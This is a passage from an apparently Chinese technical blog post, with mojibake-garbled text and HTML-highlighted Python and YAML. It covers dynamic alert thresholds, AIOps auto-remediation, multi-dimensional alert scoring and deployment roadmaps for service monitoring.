                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_a_metrics)
            },
            <span class="hljs-string">'group_b'</span>: {
                <span class="hljs-string">'alert_count'</span>: self._count_alerts(self.group_b_metrics),
                <span class="hljs-string">'false_positive_rate'</span>: self._calc_fpr(self.group_b_metrics),
                <span class="hljs-string">'mttr'</span>: self._calc_mttr(self.group_b_metrics)
            }
        }
        
        <span class="hljs-comment"># ç»Ÿè®¡æ˜¾è‘—æ€§æ£€éªŒ</span>
        p_value = self._statistical_test(results)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'results'</span>: results,
            <span class="hljs-string">'is_significant'</span>: p_value &lt; <span class="hljs-number">0.05</span>,
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-string">'adopt_dynamic'</span> <span class="hljs-keyword">if</span> results[<span class="hljs-string">'group_b'</span>][<span class="hljs-string">'false_positive_rate'</span>] &lt; results[<span class="hljs-string">'group_a'</span>][<span class="hljs-string">'false_positive_rate'</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">'keep_fixed'</span>
        }
</code></pre>
<h2 data-id="heading-34">å…«ã€æœªæ¥å±•æœ›ä¸æ¼”è¿›æ–¹å‘</h2>
<h3 data-id="heading-35">8.1 æœºå™¨å­¦ä¹ å¢å¼º</h3>
<p>æ–¹å‘ä¸€ï¼šæ·±åº¦å­¦ä¹ é¢„æµ‹æ¨¡å‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

<span class="hljs-keyword">class</span> <span class="hljs-title class_">LSTMThresholdPredictor</span>(nn.Module):
    <span class="hljs-string">"""åŸºäºLSTMçš„é˜ˆå€¼é¢„æµ‹å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_size=<span class="hljs-number">1</span>, hidden_size=<span class="hljs-number">64</span>, num_layers=<span class="hljs-number">2</span></span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.lstm = nn.LSTM(input_size, hidden_size, num_layers, batch_first=<span class="hljs-literal">True</span>)
        self.fc = nn.Linear(hidden_size, <span class="hljs-number">3</span>)  <span class="hljs-comment"># é¢„æµ‹ï¼šæœŸæœ›å€¼ã€ä¸Šç•Œã€ä¸‹ç•Œ</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):
        lstm_out, _ = self.lstm(x)
        predictions = self.fc(lstm_out[:, -<span class="hljs-number">1</span>, :])
        <span class="hljs-keyword">return</span> predictions
</code></pre>
<p>æ–¹å‘äºŒï¼šå¼‚å¸¸æ£€æµ‹ç®—æ³•èåˆ</p>
<ul>
<li>Isolation Forestï¼šæ£€æµ‹ç¦»ç¾¤ç‚¹</li>
<li>Autoencoderï¼šå­¦ä¹ æ­£å¸¸æ¨¡å¼</li>
<li>One-Class SVMï¼šå•ç±»åˆ†ç±»</li>
</ul>
<h3 data-id="heading-36">8.2 AIOpsé›†æˆ</h3>
<p>åŠ¨æ€é˜ˆå€¼ â†’ å¼‚å¸¸æ£€æµ‹ â†’ æ ¹å› åˆ†æ â†’ è‡ªåŠ¨ä¿®å¤</p>
<p>å®Œæ•´çš„AIOpsé—­ç¯ï¼š</p>
<ol>
<li>æ£€æµ‹ï¼šåŠ¨æ€é˜ˆå€¼å‘ç°å¼‚å¸¸</li>
<li>è¯Šæ–­ï¼šå…³è”åˆ†ææ‰¾åˆ°æ ¹å› </li>
<li><strong>é¢„æµ‹</strong>ï¼šé¢„æµ‹æ•…éšœå‘å±•è¶‹åŠ¿<br/>
4.<strong>å†³ç­–</strong>ï¼šæ¨èä¿®å¤æ–¹æ¡ˆ<br/>
5.<strong>æ‰§è¡Œ</strong>ï¼šè‡ªåŠ¨åŒ–ä¿®å¤<br/>
6.<strong>å­¦ä¹ </strong>ï¼šä»ç»“æœä¸­æŒç»­ä¼˜åŒ–</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIOpsEngine</span>:
    <span class="hljs-string">"""AIOpsæ™ºèƒ½è¿ç»´å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.anomaly_detector = DynamicThresholdGenerator()
        self.root_cause_analyzer = RootCauseAnalyzer()
        self.failure_predictor = FailurePredictor()
        self.auto_remediation = AutoRemediationEngine()
        self.knowledge_base = KnowledgeBase()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_anomaly</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""å¤„ç†å¼‚å¸¸çš„å®Œæ•´æµç¨‹"""</span>
        <span class="hljs-comment"># 1. å¼‚å¸¸æ£€æµ‹</span>
        anomaly_result = self.anomaly_detector.update_and_get_thresholds(
            metric_data[<span class="hljs-string">'value'</span>], 
            metric_data[<span class="hljs-string">'timestamp'</span>]
        )
        
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> anomaly_result[<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'normal'</span>}
        
        <span class="hljs-comment"># 2. æ ¹å› åˆ†æ</span>
        root_cause = self.root_cause_analyzer.analyze(
            anomaly_result,
            context=self._gather_context(metric_data)
        )
        
        <span class="hljs-comment"># 3. æ•…éšœé¢„æµ‹</span>
        prediction = self.failure_predictor.predict_impact(
            root_cause,
            time_horizon=<span class="hljs-number">3600</span>  <span class="hljs-comment"># é¢„æµ‹æœªæ¥1å°æ—¶</span>
        )
        
        <span class="hljs-comment"># 4. æŸ¥è¯¢çŸ¥è¯†åº“</span>
        similar_cases = self.knowledge_base.find_similar_incidents(root_cause)
        
        <span class="hljs-comment"># 5. ç”Ÿæˆä¿®å¤å»ºè®®</span>
        remediation_plan = self._generate_remediation_plan(
            root_cause, 
            prediction, 
            similar_cases
        )
        
        <span class="hljs-comment"># 6. è‡ªåŠ¨ä¿®å¤ï¼ˆå¦‚æœç½®ä¿¡åº¦è¶³å¤Ÿé«˜ï¼‰</span>
        <span class="hljs-keyword">if</span> remediation_plan[<span class="hljs-string">'confidence'</span>] &gt; <span class="hljs-number">0.8</span>:
            execution_result = self.auto_remediation.execute(
                remediation_plan[<span class="hljs-string">'actions'</span>]
            )
            
            <span class="hljs-comment"># 7. è®°å½•åˆ°çŸ¥è¯†åº“</span>
            self.knowledge_base.add_case({
                <span class="hljs-string">'anomaly'</span>: anomaly_result,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'remediation'</span>: remediation_plan,
                <span class="hljs-string">'result'</span>: execution_result,
                <span class="hljs-string">'timestamp'</span>: metric_data[<span class="hljs-string">'timestamp'</span>]
            })
            
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'auto_remediated'</span>,
                <span class="hljs-string">'actions_taken'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'result'</span>: execution_result
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ç½®ä¿¡åº¦ä¸è¶³ï¼Œå‘é€å‘Šè­¦ç»™äººå·¥å¤„ç†</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'status'</span>: <span class="hljs-string">'manual_intervention_required'</span>,
                <span class="hljs-string">'root_cause'</span>: root_cause,
                <span class="hljs-string">'suggested_actions'</span>: remediation_plan[<span class="hljs-string">'actions'</span>],
                <span class="hljs-string">'confidence'</span>: remediation_plan[<span class="hljs-string">'confidence'</span>]
            }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_gather_context</span>(<span class="hljs-params">self, metric_data</span>):
        <span class="hljs-string">"""æ”¶é›†ä¸Šä¸‹æ–‡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'related_metrics'</span>: self._get_related_metrics(metric_data),
            <span class="hljs-string">'recent_deployments'</span>: self._get_recent_deployments(),
            <span class="hljs-string">'system_topology'</span>: self._get_system_topology(),
            <span class="hljs-string">'historical_patterns'</span>: self._get_historical_patterns(metric_data)
        }
</code></pre>
<h3 data-id="heading-37">8.3 å¤šç»´åº¦æ™ºèƒ½å‘Šè­¦</h3>
<p><strong>ä»å•æŒ‡æ ‡åˆ°å…¨å±€è§†å›¾</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HolographicAlertingSystem</span>:
    <span class="hljs-string">"""å…¨æ¯å‘Šè­¦ç³»ç»Ÿ - å¤šç»´åº¦ç»¼åˆåˆ¤æ–­"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.dimensions = {
            <span class="hljs-string">'metric'</span>: MetricDimension(),      <span class="hljs-comment"># æŒ‡æ ‡ç»´åº¦</span>
            <span class="hljs-string">'topology'</span>: TopologyDimension(),  <span class="hljs-comment"># æ‹“æ‰‘ç»´åº¦</span>
            <span class="hljs-string">'business'</span>: BusinessDimension(),  <span class="hljs-comment"># ä¸šåŠ¡ç»´åº¦</span>
            <span class="hljs-string">'temporal'</span>: TemporalDimension()   <span class="hljs-comment"># æ—¶é—´ç»´åº¦</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_alert</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""å¤šç»´åº¦è¯„ä¼°å‘Šè­¦"""</span>
        scores = {}
        
        <span class="hljs-comment"># 1. æŒ‡æ ‡ç»´åº¦ï¼šåŠ¨æ€é˜ˆå€¼åˆ¤æ–­</span>
        scores[<span class="hljs-string">'metric'</span>] = self.dimensions[<span class="hljs-string">'metric'</span>].evaluate(event)
        
        <span class="hljs-comment"># 2. æ‹“æ‰‘ç»´åº¦ï¼šæ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        scores[<span class="hljs-string">'topology'</span>] = self.dimensions[<span class="hljs-string">'topology'</span>].evaluate(event)
        
        <span class="hljs-comment"># 3. ä¸šåŠ¡ç»´åº¦ï¼šæ˜¯å¦å½±å“æ ¸å¿ƒä¸šåŠ¡</span>
        scores[<span class="hljs-string">'business'</span>] = self.dimensions[<span class="hljs-string">'business'</span>].evaluate(event)
        
        <span class="hljs-comment"># 4. æ—¶é—´ç»´åº¦ï¼šæ˜¯å¦åœ¨å…³é”®æ—¶é—´çª—å£</span>
        scores[<span class="hljs-string">'temporal'</span>] = self.dimensions[<span class="hljs-string">'temporal'</span>].evaluate(event)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        final_score = self._weighted_score(scores)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'should_alert'</span>: final_score &gt; <span class="hljs-number">0.7</span>,
            <span class="hljs-string">'priority'</span>: self._calculate_priority(final_score),
            <span class="hljs-string">'dimension_scores'</span>: scores,
            <span class="hljs-string">'final_score'</span>: final_score,
            <span class="hljs-string">'reasoning'</span>: self._generate_reasoning(scores)
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_weighted_score</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""åŠ æƒè®¡ç®—ç»¼åˆåˆ†æ•°"""</span>
        weights = {
            <span class="hljs-string">'metric'</span>: <span class="hljs-number">0.4</span>,
            <span class="hljs-string">'topology'</span>: <span class="hljs-number">0.3</span>,
            <span class="hljs-string">'business'</span>: <span class="hljs-number">0.2</span>,
            <span class="hljs-string">'temporal'</span>: <span class="hljs-number">0.1</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(scores[dim] * weights[dim] <span class="hljs-keyword">for</span> dim <span class="hljs-keyword">in</span> scores)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_reasoning</span>(<span class="hljs-params">self, scores</span>):
        <span class="hljs-string">"""ç”Ÿæˆå¯è§£é‡Šçš„å‘Šè­¦åŸå› """</span>
        reasons = []
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'metric'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"æŒ‡æ ‡ä¸¥é‡åç¦»é¢„æœŸå€¼"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'topology'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“å…³é”®æœåŠ¡é“¾è·¯"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'business'</span>] &gt; <span class="hljs-number">0.7</span>:
            reasons.append(<span class="hljs-string">"å½±å“æ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½"</span>)
        
        <span class="hljs-keyword">if</span> scores[<span class="hljs-string">'temporal'</span>] &gt; <span class="hljs-number">0.8</span>:
            reasons.append(<span class="hljs-string">"å‘ç”Ÿåœ¨ä¸šåŠ¡é«˜å³°æœŸ"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"; "</span>.join(reasons)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TopologyDimension</span>:
    <span class="hljs-string">"""æ‹“æ‰‘ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°äº‹ä»¶åœ¨æœåŠ¡æ‹“æ‰‘ä¸­çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡ä¾èµ–å›¾</span>
        dependency_graph = self._get_dependency_graph()
        
        <span class="hljs-comment"># è®¡ç®—å½±å“èŒƒå›´</span>
        affected_services = self._calculate_blast_radius(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        is_critical_path = self._is_on_critical_path(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># è®¡ç®—åˆ†æ•°</span>
        score = <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> <span class="hljs-keyword">if</span> is_critical_path <span class="hljs-keyword">else</span> <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> * (<span class="hljs-built_in">len</span>(affected_services) / <span class="hljs-built_in">len</span>(dependency_graph))
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(score, <span class="hljs-number">1.0</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_blast_radius</span>(<span class="hljs-params">self, service, graph</span>):
        <span class="hljs-string">"""è®¡ç®—çˆ†ç‚¸åŠå¾„ï¼ˆå½±å“èŒƒå›´ï¼‰"""</span>
        affected = <span class="hljs-built_in">set</span>()
        queue = [service]
        
        <span class="hljs-keyword">while</span> queue:
            current = queue.pop(<span class="hljs-number">0</span>)
            <span class="hljs-keyword">if</span> current <span class="hljs-keyword">in</span> affected:
                <span class="hljs-keyword">continue</span>
            
            affected.add(current)
            
            <span class="hljs-comment"># æ·»åŠ æ‰€æœ‰ä¾èµ–å½“å‰æœåŠ¡çš„æœåŠ¡</span>
            <span class="hljs-keyword">for</span> dependent <span class="hljs-keyword">in</span> graph.get_dependents(current):
                queue.append(dependent)
        
        <span class="hljs-keyword">return</span> affected

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessDimension</span>:
    <span class="hljs-string">"""ä¸šåŠ¡ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°å¯¹ä¸šåŠ¡çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡çš„ä¸šåŠ¡é‡è¦æ€§</span>
        business_criticality = self._get_business_criticality(service)
        
        <span class="hljs-comment"># è·å–å½“å‰ä¸šåŠ¡é‡</span>
        current_traffic = self._get_current_traffic(service)
        normal_traffic = self._get_normal_traffic(service)
        
        <span class="hljs-comment"># æµé‡å æ¯”</span>
        traffic_ratio = current_traffic / (normal_traffic + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        score = business_criticality * <span class="hljs-built_in">min</span>(traffic_ratio, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-keyword">return</span> score
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_business_criticality</span>(<span class="hljs-params">self, service</span>):
        <span class="hljs-string">"""è·å–ä¸šåŠ¡å…³é”®åº¦"""</span>
        criticality_map = {
            <span class="hljs-string">'payment'</span>: <span class="hljs-number">1.0</span>,      <span class="hljs-comment"># æ”¯ä»˜æœåŠ¡ï¼šæœ€é«˜ä¼˜å…ˆçº§</span>
            <span class="hljs-string">'order'</span>: <span class="hljs-number">0.9</span>,        <span class="hljs-comment"># è®¢å•æœåŠ¡</span>
            <span class="hljs-string">'user'</span>: <span class="hljs-number">0.8</span>,         <span class="hljs-comment"># ç”¨æˆ·æœåŠ¡</span>
            <span class="hljs-string">'search'</span>: <span class="hljs-number">0.7</span>,       <span class="hljs-comment"># æœç´¢æœåŠ¡</span>
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-number">0.5</span> <span class="hljs-comment"># æ¨èæœåŠ¡</span>
        }
        <span class="hljs-keyword">return</span> criticality_map.get(service, <span class="hljs-number">0.3</span>)
</code></pre>
<h3 data-id="heading-38">8.4 äº‘åŸç”Ÿä¸å®¹å™¨åŒ–éƒ¨ç½²</h3>
<p><strong>Kubernetes Operatoræ¨¡å¼</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># dynamic-threshold-operator.yaml</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">monitoring.company.com/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">DynamicThreshold</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">cpu-threshold</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">production</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">metric:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">cpu_usage</span>
    <span class="hljs-attr">source:</span> <span class="hljs-string">prometheus</span>
    <span class="hljs-attr">query:</span> <span class="hljs-string">'rate(container_cpu_usage_seconds_total[5m])'</span>
  
  <span class="hljs-attr">algorithm:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">stl</span>
    <span class="hljs-attr">windowSize:</span> <span class="hljs-string">168h</span>
    <span class="hljs-attr">seasonalPeriod:</span> <span class="hljs-string">24h</span>
    <span class="hljs-attr">sigmaMultiplier:</span> <span class="hljs-number">3.0</span>
  
  <span class="hljs-attr">alerting:</span>
    <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
    <span class="hljs-attr">channels:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dingtalk</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">email</span>
    <span class="hljs-attr">suppression:</span>
      <span class="hljs-attr">cooldownPeriod:</span> <span class="hljs-string">5m</span>
  
  <span class="hljs-attr">autoRemediation:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">actions:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">scale</span>
        <span class="hljs-attr">direction:</span> <span class="hljs-string">up</span>
        <span class="hljs-attr">maxReplicas:</span> <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-39">8.5 è¾¹ç¼˜è®¡ç®—åœºæ™¯</h3>
<p><strong>æŒ‘æˆ˜</strong>ï¼š</p>
<ul>
<li>ç½‘ç»œä¸ç¨³å®šï¼Œæ— æ³•å®æ—¶ä¼ è¾“æ•°æ®</li>
<li>è®¡ç®—èµ„æºå—é™</li>
<li>éœ€è¦æœ¬åœ°å¿«é€Ÿå†³ç­–</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè½»é‡çº§è¾¹ç¼˜é˜ˆå€¼å¼•æ“</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeThresholdEngine</span>:
    <span class="hljs-string">"""è¾¹ç¼˜è®¡ç®—åœºæ™¯çš„è½»é‡çº§é˜ˆå€¼å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_memory_mb=<span class="hljs-number">50</span></span>):
        self.max_memory_mb = max_memory_mb
        self.history = deque(maxlen=<span class="hljs-number">168</span>)  <span class="hljs-comment"># ä»…ä¿ç•™7å¤©æ•°æ®</span>
        self.compressed_model = <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_model</span>(<span class="hljs-params">self, full_model</span>):
        <span class="hljs-string">"""å‹ç¼©æ¨¡å‹ä»¥é€‚åº”è¾¹ç¼˜è®¾å¤‡"""</span>
        <span class="hljs-comment"># 1. é‡åŒ–ï¼šfloat64 â†’ float16</span>
        compressed = {
            <span class="hljs-string">'trend'</span>: full_model[<span class="hljs-string">'trend'</span>].astype(np.float16),
            <span class="hljs-string">'seasonal'</span>: full_model[<span class="hljs-string">'seasonal'</span>].astype(np.float16),
            <span class="hljs-string">'residual_std'</span>: np.float16(full_model[<span class="hljs-string">'residual_std'</span>])
        }
        
        <span class="hljs-comment"># 2. é™é‡‡æ ·ï¼šä¿ç•™å…³é”®ç‚¹</span>
        compressed[<span class="hljs-string">'trend'</span>] = self._downsample(compressed[<span class="hljs-string">'trend'</span>], factor=<span class="hljs-number">2</span>)
        compressed[<span class="hljs-string">'seasonal'</span>] = self._downsample(compressed[<span class="hljs-string">'seasonal'</span>], factor=<span class="hljs-number">2</span>)
        
        self.compressed_model = compressed
        <span class="hljs-keyword">return</span> compressed
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lightweight_detection</span>(<span class="hljs-params">self, value, timestamp</span>):
        <span class="hljs-string">"""è½»é‡çº§å¼‚å¸¸æ£€æµ‹"""</span>
        <span class="hljs-keyword">if</span> self.compressed_model <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">'reason'</span>: <span class="hljs-string">'model_not_ready'</span>}
        
        <span class="hljs-comment"># ä½¿ç”¨ç®€åŒ–çš„åˆ¤æ–­é€»è¾‘</span>
        hour_of_day = timestamp.hour
        expected = (
            self.compressed_model[<span class="hljs-string">'trend'</span>][-<span class="hljs-number">1</span>] + 
            self.compressed_model[<span class="hljs-string">'seasonal'</span>][hour_of_day % <span class="hljs-number">24</span>]
        )
        
        threshold = <span class="hljs-number">3</span> * self.compressed_model[<span class="hljs-string">'residual_std'</span>]
        
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(value - expected) &gt; threshold:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'expected'</span>: <span class="hljs-built_in">float</span>(expected),
                <span class="hljs-string">'threshold'</span>: <span class="hljs-built_in">float</span>(threshold),
                <span class="hljs-string">'deviation'</span>: <span class="hljs-built_in">float</span>(value - expected)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_with_cloud</span>(<span class="hljs-params">self, cloud_endpoint</span>):
        <span class="hljs-string">"""ä¸äº‘ç«¯åŒæ­¥æ¨¡å‹"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä¸Šä¼ æœ¬åœ°æ•°æ®</span>
            self._upload_data(cloud_endpoint)
            
            <span class="hljs-comment"># ä¸‹è½½æ›´æ–°çš„æ¨¡å‹</span>
            updated_model = self._download_model(cloud_endpoint)
            self.compressed_model = self.compress_model(updated_model)
            
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'synced'</span>}
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># ç½‘ç»œæ•…éšœæ—¶ç»§ç»­ä½¿ç”¨æœ¬åœ°æ¨¡å‹</span>
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'offline'</span>, <span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(e)}
</code></pre>
<h2 data-id="heading-40">ä¹ã€æœ€ä½³å®è·µæ€»ç»“</h2>
<h3 data-id="heading-41">9.1 å®æ–½è·¯çº¿å›¾</h3>
<p><strong>é˜¶æ®µä¸€ï¼šè¯•ç‚¹éªŒè¯ï¼ˆ1-2å‘¨ï¼‰</strong></p>
<ol>
<li>é€‰æ‹©1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¿›è¡Œè¯•ç‚¹</li>
<li>ä¸ç°æœ‰å›ºå®šé˜ˆå€¼å¹¶è¡Œè¿è¡Œ</li>
<li>æ”¶é›†æ•°æ®ï¼Œå¯¹æ¯”æ•ˆæœ</li>
</ol>
<p><strong>é˜¶æ®µäºŒï¼šå°èŒƒå›´æ¨å¹¿ï¼ˆ1ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>æ‰©å±•åˆ°10-20ä¸ªæœåŠ¡</li>
<li>å»ºç«‹è¿ç»´åé¦ˆæœºåˆ¶</li>
<li>ä¼˜åŒ–å‚æ•°é…ç½®</li>
</ol>
<p><strong>é˜¶æ®µä¸‰ï¼šå…¨é¢éƒ¨ç½²ï¼ˆ2-3ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>è¦†ç›–æ‰€æœ‰å…³é”®æœåŠ¡</li>
<li>é›†æˆåˆ°ç°æœ‰ç›‘æ§å¹³å°</li>
<li>åŸ¹è®­è¿ç»´å›¢é˜Ÿ</li>
</ol>
<p><strong>é˜¶æ®µå››ï¼šæŒç»­ä¼˜åŒ–ï¼ˆé•¿æœŸï¼‰</strong></p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ </li>
<li>é›†æˆAIOpsèƒ½åŠ›</li>
<li>æ‰©å±•åˆ°æ›´å¤šåœºæ™¯</li>
</ol>
<h3 data-id="heading-42">9.2 é…ç½®è°ƒä¼˜æŒ‡å—</h3>
<p><strong>çª—å£å¤§å°é€‰æ‹©</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_window_size</span>(<span class="hljs-params">metric_type, data_pattern</span>):
    <span class="hljs-string">"""æ¨èçª—å£å¤§å°"""</span>
    <span class="hljs-keyword">if</span> data_pattern == <span class="hljs-string">'high_volatility'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é«˜æ³¢åŠ¨ï¼šçŸ­çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'stable'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># ç¨³å®šï¼šæ ‡å‡†çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'long_term_trend'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">720</span>  <span class="hljs-comment"># é•¿æœŸè¶‹åŠ¿ï¼šé•¿çª—å£</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># é»˜è®¤</span>
</code></pre>
<p><strong>Sigmaå€æ•°è°ƒæ•´</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_sigma_multiplier</span>(<span class="hljs-params">false_positive_rate</span>):
    <span class="hljs-string">"""æ ¹æ®è¯¯æŠ¥ç‡æ¨èsigmaå€æ•°"""</span>
    <span class="hljs-keyword">if</span> false_positive_rate &gt; <span class="hljs-number">0.5</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">4.0</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šæ”¾å®½é˜ˆå€¼</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.5</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.0</span>  <span class="hljs-comment"># æ ‡å‡†</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">2.5</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡ä½ï¼šå¯ä»¥æ”¶ç´§</span>
</code></pre>
<h3 data-id="heading-43">9.3 ç›‘æ§æŒ‡æ ‡ä½“ç³»</h3>
<p><strong>ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemHealthMetrics</span>:
    <span class="hljs-string">"""ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_metrics</span>(<span class="hljs-params">alerting_system</span>):
